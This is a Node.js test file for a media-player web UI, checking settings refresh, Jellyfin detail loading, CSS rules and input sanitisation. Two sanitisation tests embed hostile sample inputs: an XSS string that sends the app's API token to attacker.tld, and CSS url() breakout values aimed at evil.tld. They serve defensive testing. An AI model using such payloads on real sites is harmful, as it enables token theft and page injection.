'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const UI_DIR = path.join(__dirname, '../../app/relaytv_app/static/ui');
const APP_JS = fs.readFileSync(path.join(UI_DIR, 'app.js'), 'utf8');
const JELLYFIN_JS = fs.readFileSync(path.join(UI_DIR, 'jellyfin.js'), 'utf8');
const PLEX_JS = fs.readFileSync(path.join(UI_DIR, 'plex.js'), 'utf8');
const APP_CSS = fs.readFileSync(path.join(UI_DIR, 'app.css'), 'utf8');
const SEERR_CSS = fs.readFileSync(path.join(UI_DIR, 'seerr.css'), 'utf8');
const PLEX_CSS = fs.readFileSync(path.join(UI_DIR, 'plex.css'), 'utf8');

function extractFunction(source, name) {
  for (const prefix of [`async function ${name}(`, `function ${name}(`]) {
    const start = source.indexOf(prefix);
    if (start === -1) continue;
    let depth = 0;
    let seenBody = false;
    for (let i = start; i < source.length; i++) {
      const ch = source[i];
      if (ch === '{') {
        depth++;
        seenBody = true;
      } else if (ch === '}') {
        depth--;
        if (seenBody && depth === 0) return source.slice(start, i + 1);
      }
    }
  }
  throw new Error(`${name} not found`);
}

function createFakeElement(tag = 'div', owner = null) {
  const classes = new Set();
  const attributes = new Map();
  const listeners = new Map();
  const children = [];
  let textVal = '';
  let innerHtmlAssigned = false;

  const el = {
    tagName: String(tag || 'div').toUpperCase(),
    id: '',
    value: '',
    checked: false,
    disabled: false,
    style: {},
    dataset: {},
    children,
    listeners,
    parentNode: null,
    parentElement: null,
    get innerHtmlAssigned() {
      return innerHtmlAssigned;
    },
    get textContent() {
      if (children.length > 0) {
        return children.map((c) => c.textContent).join('');
      }
      return textVal;
    },
    set textContent(v) {
      children.length = 0;
      textVal = String(v ?? '');
    },
    get innerHTML() {
      return '';
    },
    set innerHTML(v) {
      const s = String(v ?? '');
      if (s !== '') {
        innerHtmlAssigned = true;
        // Simulate HTML tag creation if non-empty HTML is assigned so tests fail if innerHTML is used
        const tagMatches = s.matchAll(/<([a-zA-Z0-9-]+)([^>]*)>/g);
        children.length = 0;
        for (const m of tagMatches) {
          const child = createFakeElement(m[1], owner);
          children.push(child);
        }
      } else {
        children.length = 0;
        textVal = '';
      }
    },
    get className() {
      return Array.from(classes).join(' ');
    },
    set className(v) {
      classes.clear();
      String(v || '')
        .split(/\s+/)
        .filter(Boolean)
        .forEach((c) => classes.add(c));
    },
    classList: {
      add: (...names) => names.forEach((n) => classes.add(n)),
      remove: (...names) => names.forEach((n) => classes.delete(n)),
      contains: (n) => classes.has(n),
      toggle: (n, force) => {
        const on = force === undefined ? !classes.has(n) : !!force;
        if (on) classes.add(n);
        else classes.delete(n);
        return on;
      },
    },
    setAttribute(name, val) {
      const s = String(val);
      attributes.set(name, s);
      if (name === 'id') {
        this.id = s;
        if (owner) owner.set(s, this);
      }
    },
    getAttribute(name) {
      return attributes.has(name) ? attributes.get(name) : null;
    },
    appendChild(child) {
      if (!child) return child;
      child.parentNode = this;
      child.parentElement = this;
      children.push(child);
      if (child.id && owner) owner.set(child.id, child);
      return child;
    },
    append(...nodes) {
      nodes.forEach((n) => this.appendChild(n));
    },
    replaceChildren(...nodes) {
      children.length = 0;
      nodes.forEach((n) => this.appendChild(n));
    },
    contains(target) {
      let cur = target;
      while (cur) {
        if (cur === this) return true;
        cur = cur.parentNode || cur.parentElement || null;
      }
      return false;
    },
    addEventListener(type, fn) {
      if (!listeners.has(type)) listeners.set(type, []);
      listeners.get(type).push(fn);
    },
    dispatchEvent(type, eventObj) {
      const list = listeners.get(type) || [];
      for (const fn of list) fn(eventObj);
    },
    querySelectorAll(selector) {
      const out = [];
      const visit = (node) => {
        for (const child of node.children || []) {
          if (matchesSimpleSelector(child, selector)) out.push(child);
          visit(child);
        }
      };
      visit(this);
      return out;
    },
    querySelector(selector) {
      return this.querySelectorAll(selector)[0] || null;
    },
    focus() {},
  };
  return el;
}

function matchesSimpleSelector(el, selector) {
  const s = String(selector || '').trim().toLowerCase();
  if (!s) return false;
  if (s === 'img' || s === 'script' || s === 'span' || s === 'button') {
    return el.tagName.toLowerCase() === s;
  }
  return false;
}

test('audio and subtitle track pickers render untrusted metadata as inert text without innerHTML', () => {
  const elements = new Map();
  for (const id of [
    'langList',
    'langCurrent',
    'langMsg',
    'subLangList',
    'subLangCurrent',
    'subLangMsg',
  ]) {
    const el = createFakeElement('div', elements);
    el.id = id;
    elements.set(id, el);
  }

  const context = vm.createContext({
    Number,
    String,
    Array,
    document: {
      getElementById: (id) => elements.get(id) || null,
      createElement: (tag) => createFakeElement(tag, elements),
    },
    fetch: async () => ({ok: true, json: async () => ({})}),
    refresh: async () => {},
  });

  vm.runInContext(extractFunction(APP_JS, '_renderNowLanguageOptions'), context);
  vm.runInContext(extractFunction(APP_JS, '_renderNowSubtitleOptions'), context);

  const xssDisplay = '<img src=x onerror="fetch(\'https://attacker.tld/?t=\'+localStorage.getItem(\'relaytv_api_token\'))">';
  const xssLang = '<script>alert(1)</script>';

  context._renderNowLanguageOptions({
    current_audio_language: 'eng',
    current_audio_stream_index: 1,
    options: [
      {
        index: 1,
        language: xssLang,
        display: xssDisplay,
        is_default: true,
        is_current: true,
      },
    ],
  });

  const langList = elements.get('langList');
  assert.equal(langList.children.length, 1);
  const audioBtn = langList.children[0];
  assert.equal(audioBtn.innerHtmlAssigned, false, 'audio track button must not use innerHTML');
  assert.equal(audioBtn.querySelectorAll('img').length, 0);
  assert.equal(audioBtn.querySelectorAll('script').length, 0);
  assert.equal(audioBtn.children.length, 3);
  assert.ok(audioBtn.children.every((c) => c.tagName === 'SPAN'));
  assert.equal(audioBtn.children[0].textContent, '#1');
  assert.equal(audioBtn.children[1].textContent, `${xssLang.toUpperCase()} — ${xssDisplay}`);
  assert.equal(audioBtn.children[2].textContent, 'default · active');

  context._renderNowSubtitleOptions({
    current_subtitle_off: false,
    current_subtitle_language: 'eng',
    current_subtitle_stream_index: 2,
    options: [
      {
        index: -1,
        is_off: true,
        is_current: false,
      },
      {
        index: 2,
        language: xssLang,
        display: xssDisplay,
        is_default: false,
        is_current: true,
      },
    ],
  });

  const subList = elements.get('subLangList');
  assert.equal(subList.children.length, 2);
  const subBtn = subList.children[1];
  assert.equal(subBtn.innerHtmlAssigned, false, 'subtitle track button must not use innerHTML');
  assert.equal(subBtn.querySelectorAll('img').length, 0);
  assert.equal(subBtn.querySelectorAll('script').length, 0);
  assert.equal(subBtn.children.length, 3);
  assert.ok(subBtn.children.every((c) => c.tagName === 'SPAN'));
  assert.equal(subBtn.children[0].textContent, '#2');
  assert.equal(subBtn.children[1].textContent, `${xssLang.toUpperCase()} — ${xssDisplay}`);
  assert.equal(subBtn.children[2].textContent, 'active');
});

test('CSS backgroundImage helpers strip quote and parenthesis breakout characters', () => {
  const context = vm.createContext({
    String,
    document: {
      getElementById: () => null,
      createElement: (tag) => createFakeElement(tag),
    },
  });
  vm.runInContext(extractFunction(APP_JS, '_safeCssUrlValue'), context);
  vm.runInContext(extractFunction(APP_JS, 'setBg'), context);
  vm.runInContext(extractFunction(PLEX_JS, '_plexRenderDetail'), context);

  const heroEl = createFakeElement('div');
  const maliciousUrl = `https://example.com/a.jpg'), url('https://evil.tld/steal?x="\\`;
  context.setBg(heroEl, maliciousUrl);
  assert.ok(!heroEl.style.backgroundImage.includes("'), url('"), heroEl.style.backgroundImage);
  assert.equal(
    heroEl.style.backgroundImage,
    "linear-gradient(to top, rgba(0,0,0,.45) 0%, rgba(0,0,0,.30) 40%, rgba(0,0,0,.10) 75%, rgba(0,0,0,.05) 100%), url('https://example.com/a.jpg, url(https://evil.tld/steal?x=')",
  );

  const plexDetail = createFakeElement('div');
  context.document.getElementById = (id) => (id === 'plexDetail' ? plexDetail : null);
  context._plexFormatDuration = () => '';
  context._plexRenderDetail({
    id: '1',
    type: 'movie',
    title: 'Test',
    backdrop_url: `https://plex.example/art.jpg"); background: url("https://evil.tld/pwn`,
  });
  const plexHero = plexDetail.children[0];
  assert.equal(
    plexHero.style.backgroundImage,
    'url("https://plex.example/art.jpg; background: url(https://evil.tld/pwn")',
  );
});

test('_applyUiJellyfinEvent skips loadSettingsUi when Settings has unsaved edits or focused input, but refreshes clean open Settings', () => {
  const elements = new Map();
  const bd = createFakeElement('div', elements);
  bd.id = 'settingsBackdrop';
  elements.set('settingsBackdrop', bd);

  const serverInput = createFakeElement('input', elements);
  serverInput.id = 'setJfServerUrl';
  bd.appendChild(serverInput);

  let loadCalls = 0;
  const context = vm.createContext({
    console,
    String,
    document: {
      activeElement: null,
      getElementById: (id) => elements.get(id) || null,
      querySelectorAll: () => [],
    },
    window: {
      addEventListener() {},
      setTimeout() {},
    },
    __uiNavDepth: 0,
    __jfUiVisible: false,
    __activeSettingsTab: 'device',
    _uiEventMarkAlive() {},
    _uiPushLayer() {},
    closeHeaderMenu() {},
    refresh: async () => {},
    loadSettingsUi: async () => {
      loadCalls += 1;
    },
  });

  vm.runInContext('var __settingsDirty = false;', context);
  vm.runInContext(extractFunction(APP_JS, '_isSettingsControlFocused'), context);
  vm.runInContext(extractFunction(APP_JS, '_applyUiJellyfinEvent'), context);
  vm.runInContext(extractFunction(APP_JS, 'openSettings'), context);
  vm.runInContext(extractFunction(APP_JS, 'closeSettings'), context);
  vm.runInContext(extractFunction(APP_JS, '_selectSettingsTab'), context);
  vm.runInContext(extractFunction(APP_JS, 'bindSettingsUi'), context);
  context.bindSettingsUi();

  // 1. Open settings cleanly (starts hidden)
  bd.classList.add('hidden');
  context.openSettings();
  assert.equal(bd.classList.contains('hidden'), false);
  assert.equal(loadCalls, 1);
  assert.equal(context.__settingsDirty, false);

  // 2. Clean open settings refreshes when refresh_settings arrives
  context._applyUiJellyfinEvent({refresh_settings: true});
  assert.equal(loadCalls, 2);

  // 3. Focused editable input inside #settingsBackdrop prevents refresh clobbering
  context.document.activeElement = serverInput;
  context._applyUiJellyfinEvent({refresh_settings: true});
  assert.equal(loadCalls, 2, 'must not reload settings while an input inside #settingsBackdrop is focused');

  // 4. Blur input, but user typed into #settingsBackdrop (dirty state)
  context.document.activeElement = null;
  bd.dispatchEvent('input', {target: serverInput});
  assert.equal(context.__settingsDirty, true);
  context._applyUiJellyfinEvent({refresh_settings: true});
  assert.equal(loadCalls, 2, 'must not reload settings while __settingsDirty is true');

  // 5. Closing and reopening Settings resets __settingsDirty so clean refresh works again
  context.closeSettings({fromNav: true});
  assert.equal(context.__settingsDirty, false);
  context.openSettings();
  assert.equal(loadCalls, 3);
  context._applyUiJellyfinEvent({refresh_settings: true});
  assert.equal(loadCalls, 4);
});

test('loadJellyfinDetail ignores out-of-order stale responses and does not reopen a closed drawer on error', async () => {
  const elements = new Map();
  for (const id of ['jellyfinShell', 'jfGrid', 'jfDetail', 'jfRows']) {
    const el = createFakeElement('div', elements);
    el.id = id;
    elements.set(id, el);
  }

  const pendingFetches = new Map();
  const context = vm.createContext({
    AbortController,
    Set,
    Map,
    Math,
    Number,
    String,
    Boolean,
    Array,
    Object,
    JSON,
    Promise,
    Error,
    __uiNavDepth: 0,
    _uiPushLayer() {},
    refresh: async () => {},
    requestAnimationFrame: (fn) => fn(),
    setTimeout: () => 1,
    clearTimeout() {},
    window: {
      innerWidth: 1280,
      matchMedia: () => ({matches: false}),
      addEventListener() {},
      setTimeout: () => 1,
    },
    document: {
      activeElement: null,
      body: createFakeElement('body'),
      getElementById: (id) => elements.get(id) || null,
      createElement: (tag) => createFakeElement(tag, elements),
      createDocumentFragment: () => createFakeElement('fragment', elements),
      querySelectorAll: () => [],
      querySelector: () => null,
    },
    fetch: (url) =>
      new Promise((resolve, reject) => {
        pendingFetches.set(String(url), {resolve, reject});
      }),
  });

  vm.runInContext(JELLYFIN_JS, context);
  vm.runInContext('_jfSetShellVisible(true);', context);

  // Part A: Out-of-order responses (Item A slow, Item B fast)
  const promiseA = vm.runInContext("loadJellyfinDetail('item-a')", context);
  const promiseB = vm.runInContext("loadJellyfinDetail('item-b')", context);

  assert.equal(vm.runInContext('__jfSelectedItemId', context), 'item-b');
  assert.equal(elements.get('jfGrid').classList.contains('detailOpen'), true);

  // Resolve B first
  pendingFetches.get('/browse/item/item-b').resolve({
    ok: true,
    status: 200,
    json: async () => ({item: {item_id: 'item-b', title: 'Movie B', type: 'movie'}}),
  });
  await promiseB;
  assert.equal(vm.runInContext('__jfSelectedItem && __jfSelectedItem.title', context), 'Movie B');
  assert.equal(elements.get('jfDetailTitle').textContent, 'Movie B');

  // Now resolve A late — must NOT overwrite Movie B
  pendingFetches.get('/browse/item/item-a').resolve({
    ok: true,
    status: 200,
    json: async () => ({item: {item_id: 'item-a', title: 'Movie A', type: 'movie'}}),
  });
  await promiseA;
  assert.equal(vm.runInContext('__jfSelectedItem && __jfSelectedItem.title', context), 'Movie B');
  assert.equal(elements.get('jfDetailTitle').textContent, 'Movie B');

  // Part B: Closing detail drawer while fetch is in flight and then fetch rejects must NOT reopen drawer
  const promiseC = vm.runInContext("loadJellyfinDetail('item-c')", context);
  assert.equal(elements.get('jfGrid').classList.contains('detailOpen'), true);

  vm.runInContext('_jfCloseDetailPanel({fromNav: true})', context);
  assert.equal(elements.get('jfGrid').classList.contains('detailOpen'), false);

  pendingFetches.get('/browse/item/item-c').reject(new Error('network failure'));
  await promiseC;

  assert.equal(
    elements.get('jfGrid').classList.contains('detailOpen'),
    false,
    'rejected stale fetch must not reopen a closed detail drawer',
  );
  assert.equal(
    elements.get('jfDetail').textContent,
    'Select a Jellyfin item to view details.',
  );
});

test('iOS standalone PWA safe-area top inset rules are present in app.css, seerr.css, and plex.css', () => {
  assert.match(
    APP_CSS,
    /body\s*\{[\s\S]*?padding:\s*max\(4px,\s*env\(safe-area-inset-top\)\)\s+14px\s+max\(16px,\s*env\(safe-area-inset-bottom\)\);/,
  );
  assert.match(
    APP_CSS,
    /#settingsBackdrop\.modalBackdrop\s*\{[\s\S]*?padding:\s*max\(8px,\s*env\(safe-area-inset-top\)\)\s+8px\s+max\(8px,\s*env\(safe-area-inset-bottom\)\);/,
  );
  assert.match(
    APP_CSS,
    /\.modal\.settingsModal\s*\{[\s\S]*?max-height:\s*calc\(100dvh\s*-\s*max\(8px,\s*env\(safe-area-inset-top\)\)\s*-\s*max\(8px,\s*env\(safe-area-inset-bottom\)\)\);/,
  );
  assert.match(
    SEERR_CSS,
    /\.seerrShellHead\{[^}]*padding:max\(10px,\s*env\(safe-area-inset-top\)\)\s+clamp\(14px,3vw,38px\)\s+10px/,
  );
  assert.match(
    PLEX_CSS,
    /\.plexShellHead\{[^}]*padding:max\(14px,\s*env\(safe-area-inset-top\)\)\s+clamp\(14px,3vw,38px\)\s+14px/,
  );
});
